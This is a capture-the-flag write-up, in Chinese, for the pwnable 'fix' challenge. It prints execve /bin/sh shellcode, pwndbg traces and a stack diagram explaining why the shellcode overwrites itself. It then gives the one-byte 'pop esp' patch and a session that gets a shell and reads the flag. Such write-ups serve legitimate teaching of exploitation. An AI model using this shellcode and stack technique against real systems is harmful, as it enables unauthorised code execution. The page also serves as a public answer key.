# fix

只能修改一個byte 去讓shellcode 成功執行

```
"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"


0:  31 c0                   xor    eax,eax
2:  50                      push   rax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   rax
10: 53                      push   rbx
11: 89 e1                   mov    ecx,esp
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```

這邊在覆蓋 ret addr 前都是正常的 shellcode
```
──────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────────────────────
   0x8048521 <shellcode+6>     sub    esp, 8
   0x8048524 <shellcode+9>     push   sc                            <0x804a02c>
   0x8048529 <shellcode+14>    lea    eax, [ebp - 0x1c]
   0x804852c <shellcode+17>    push   eax
 ► 0x804852d <shellcode+18>    call   strcpy@plt                     <strcpy@plt>
        dest: 0xff8beebc ◂— 0x2
        src: 0x804a02c (sc) ◂— 0x6850c031
 
   0x8048532 <shellcode+23>    add    esp, 0x10
   0x8048535 <shellcode+26>    lea    eax, [ebp - 0x1c]
   0x8048538 <shellcode+29>    add    eax, 0x20
   0x804853b <shellcode+32>    lea    edx, [ebp - 0x1c]
   0x804853e <shellcode+35>    mov    dword ptr [eax], edx
   0x8048540 <shellcode+37>    sub    esp, 0xc
─────────────────────────────────────────────────────────

pwndbg> x/16wi 0x804a02c
   0x804a02c <sc>:      xor    eax,eax
   0x804a02e <sc+2>:    push   eax
   0x804a02f <sc+3>:    push   0x68732f2f
   0x804a034 <sc+8>:    push   0x6e69622f
   0x804a039 <sc+13>:   mov    ebx,esp
   0x804a03b <sc+15>:   push   eax
   0x804a03c <sc+16>:   push   ebx     <- die here
   0x804a03d <sc+17>:   mov    ecx,esp
   0x804a03f <sc+19>:   mov    al,0xb
   0x804a041 <sc+21>:   int    0x80
   0x804a043 <sc+23>:   add    BYTE PTR [eax],al
   0x804a045:   add    BYTE PTR [eax],al
   0x804a047:   add    BYTE PTR [eax],al
   0x804a049:   add    BYTE PTR [eax],al
   0x804a04b:   add    BYTE PTR [eax],al
   0x804a04d:   add    BYTE PTR [eax],al
```

因為在`shellcode函數`內，會先 leave 再跳到他的shellcode 上，所以執行 shellcode 時是在 main 的 stack

shellcode 是直接蓋在`shellcode函數`的 ret address

所以 shellcode 在 push 東西上去，esp 會變大，然後會去蓋掉 shellcode

示意圖
```
H
                                //esp
    main stack	push something  //esp +4          
    main stack	push something            
    main stack	shellcode  // push something  這裡就會蓋到 shellcode
    main stack	shellcode
    main stack	shellcode 
    	        shellcode func ret addr

L

```



所以想辦法把esp調大，修改 `<sc+15>:   push   eax`，改成 `pop esp`

```
   0xffcc446c    xor    eax, eax
   0xffcc446e    push   eax
   0xffcc446f    push   0x68732f2f
   0xffcc4474    push   0x6e69622f
   0xffcc4479    mov    ebx, esp  // 已經把 /bin/sh 存在 ebx
   0xffcc447b    pop    esp       // 取得超大 esp
   0xffcc447c    push   ebx
   0xffcc447d    mov    ecx, esp  //argv
   0xffcc447f    mov    al, 0xb
 ► 0xffcc4481    int    0x80 <SYS_execve>
        path: 0xffcc4484 —▸ 0x6e69622f ◂— 0x0
        argv: 0x6e69622b —▸ 0xffcc4484 —▸ 0x6e69622f ◂— 0x0
        envp: 0x1
pwndbg> x/8s 0xffcc4484
0xffcc4484:     "/bin//sh"
```


```
fix@pwnable:~$ ulimit -s unlimited
fix@pwnable:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ ls
fix  fix.c  flag  intended_solution.txt
$ whoami
fix
$ cat flag
```



